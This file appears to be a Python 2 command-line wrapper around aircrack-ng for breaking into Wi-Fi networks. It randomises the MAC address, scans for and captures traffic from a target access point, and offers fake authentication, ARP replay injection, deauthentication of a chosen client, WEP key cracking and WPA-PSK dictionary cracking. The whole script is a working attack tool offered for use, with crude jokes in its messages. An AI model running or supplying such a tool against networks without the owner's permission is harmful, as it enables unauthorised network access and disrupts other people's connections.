#!/usr/bin/python

import os

def init(): 
	initlist= ';'.join(("service network-manager stop",
		"airmon-ng stop mon4",
                "airmon-ng stop mon3",
                "airmon-ng stop mon2",
                "airmon-ng stop mon1",
                "airmon-ng stop mon0",
                "airmon-ng stop "+interface,
		"ifconfig "+interface+" down",
		"airmon-ng start "+interface,
		"airmon-ng start "+interface,
		"ifconfig mon0 down",
		"ifconfig mon1 down",
		"macchanger -r mon0",
		"macchanger -r mon1",
		"ifconfig "+interface+" up",
		"ifconfig mon0 up",
		"ifconfig mon1 up"))
	os.system(initlist)

def housekeeping():
	#back to normal
	houselist= ';'.join(("airmon-ng stop mon4",
		"airmon-ng stop mon3",
		"airmon-ng stop mon2",
		"airmon-ng stop mon1",
		"airmon-ng stop mon0",
		"airmon-ng stop "+interface,
		"service network-manager start",))
	os.system(houselist)
	os.sys.exit()

def scan():
	print "airodump-ng -t WEP -t WPA -t WPA1 mon1"
	os.system("airodump-ng -t WEP -t WPA -t WPA1 mon1")

def listen():
	print "gnome-terminal -x airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" mon1 &"
	os.system("gnome-terminal -x airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" mon1 &")

def fakeauth():
	fauth_success = "y"
        while (fauth_success == "y"):
		print "aireplay-ng -1 0 -a "+bssid+" -h "+station+" -e "+essid+" mon0"
		os.system("aireplay-ng -1 0 -a "+bssid+" -h "+station+" -e "+essid+" mon0") 
		fauth_success = raw_input("\nretry?: ")

def arpreplay():
	print "gnome-terminal -x aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &"
	os.system("gnome-terminal -x aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")

def deauthsome1():
	print "gnome-terminal -x aireplay-ng -0 5 -a "+bssid+" -c "+target_station+" mon0 &"
	os.system("gnome-terminal -x aireplay-ng -0 5 -a "+bssid+" -c "+target_station+" mon0 &")

def WPA_PSK():
	print "gnome-terminal -x aircrack-ng -w password.lst -b "+bssid+" box/"+essid+"*.cap &"
	os.system("gnome-terminal -x aircrack-ng -w password.lst -b "+bssid+" box/"+essid+"*.cap & echo w00t \ ")
#	os.system("aircrack-ng -w password.lst -b "+bssid+" box/"+essid+"*.cap &")
def aircrack():
	print "gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &"
	os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap & echo w00t \ ")
	print "aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &"
	os.system("aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &")
#=========================qr=============================D

interface = "wlan0"
interface = raw_input("interface: ")
init()
scan()

# input target prefs
bssid = raw_input("bssid: ")
essid = raw_input("essid: ")
channel = raw_input("channel: ")
macshow = os.popen("macchanger -s mon0")
station = macshow.read()[13:30]

# starts listening for ivs
listen()

cont = "n"
while (cont == "n"): 
	listen_selection = raw_input("\n 0 Change Target\n 1 Fake-auth(FAST)\n 2 ARP Replay\n 3 Aircrack\n 4 WPA PSK Crack\n 5 Deauth Someone \n 6 Quit\n\nplease pick a number: ")
	if listen_selection == "1":
		fakeauth()
	elif listen_selection == "2":
		arpreplay()
	elif listen_selection == "3":
		aircrack()
	elif listen_selection == "6":
		housekeeping()
	elif listen_selection == "0":
		scan()
		# input target prefs
		bssid = raw_input("bssid: ")
		essid = raw_input("essid: ")
		channel = raw_input("channel: ")
		macshow = os.popen("macchanger -s mon0")
		station = macshow.read()[13:30]
	elif listen_selection == "4":
		WPA_PSK()
	elif listen_selection == "5":
		target_station = raw_input("Input station target: ")
		deauthsome1()		
	elif listen_selection == "qr":
		print "Oh god dammit, fuck you"
		housekeeping()
	else:
	     print ">:("
	
print "I'm out biatch"
